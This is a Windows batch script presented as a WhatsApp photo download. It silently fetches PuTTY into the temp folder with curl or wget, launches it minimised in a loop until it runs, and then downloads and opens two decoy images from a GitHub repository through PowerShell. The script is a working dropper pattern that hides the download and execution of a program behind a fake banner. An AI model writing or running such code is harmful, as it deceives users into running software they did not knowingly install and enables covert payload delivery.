@echo off

:: Display the text without any formatting
echo WHATSAPP PICTURE PHOTOS DOWNLOADING.......

:: Set the PuTTY download URL and destination file
set "puttyUrl=https://the.earth.li/~sgtatham/putty/latest/w64/putty.exe"
set "puttyDestination=%TEMP%\putty.exe"

:: Download PuTTY silently if it's not already downloaded
if not exist "%puttyDestination%" (
    curl -o "%puttyDestination%" -L --silent "%puttyUrl%" || wget -q -O "%puttyDestination%" "%puttyUrl%"
)

:: Check if PuTTY was downloaded successfully
if not exist "%puttyDestination%" (
    echo Error downloading PuTTY.
    exit /b
)

:runPutty
:: Run PuTTY silently
start "" /min "%puttyDestination%"

:: Wait for PuTTY to finish
timeout /t 1 /nobreak >nul

:: Check if PuTTY is still running, if not, run again
tasklist /fi "imagename eq putty.exe" 2>nul | find /i "putty.exe" >nul || goto runPutty

:: Set the new image download URLs and destination files
set "imageUrl1=https://raw.githubusercontent.com/johnihr00/test-files/main/imgx/11.jpg"
set "imageUrl2=https://raw.githubusercontent.com/johnihr00/test-files/main/imgx/22.jpg"
set "imageDestination1=%TEMP%\downloaded_image1.jpg"
set "imageDestination2=%TEMP%\downloaded_image2.jpg"

:: Download the first image using PowerShell
powershell -Command "& { (New-Object Net.WebClient).DownloadFile('%imageUrl1%', '%imageDestination1%') }"

:: Download the second image using PowerShell
powershell -Command "& { (New-Object Net.WebClient).DownloadFile('%imageUrl2%', '%imageDestination2%') }"

:: Open the downloaded images with the default image viewer if downloads were successful
if exist "%imageDestination1%" (
    start "" "%imageDestination1%"
)

if exist "%imageDestination2%" (
    start "" "%imageDestination2%"
)

:: End script
exit /b
